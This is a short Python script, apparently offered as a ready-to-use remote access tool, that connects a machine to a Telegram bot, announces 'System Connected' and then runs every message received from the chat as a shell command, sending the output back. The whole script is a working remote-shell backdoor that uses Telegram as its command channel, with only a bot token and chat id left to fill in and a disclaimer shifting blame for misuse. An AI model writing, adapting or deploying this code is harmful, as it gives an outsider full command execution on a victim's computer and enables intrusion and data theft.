import platform
import requests
import subprocess
import telebot

print("Script Make By : Arman Nouri \nInstagram : Arman_nouri_pg \nTelegram : Ar0_1man \nAttention : Any misuse of the script is responsibility of the person ")


bot_token = "Enter Your bot token"

chat_id = Enter_Your_Chat_Id

bot = telebot.TeleBot(bot_token)

bot.send_message(chat_id , "System Connected ")

@bot.message_handler(func=lambda message:True)
def sendinf(message):
    try :
        command = message.text
        output = subprocess.getoutput(command)
        bot.reply_to(message , output  )
    except:
        pass


bot.infinity_polling()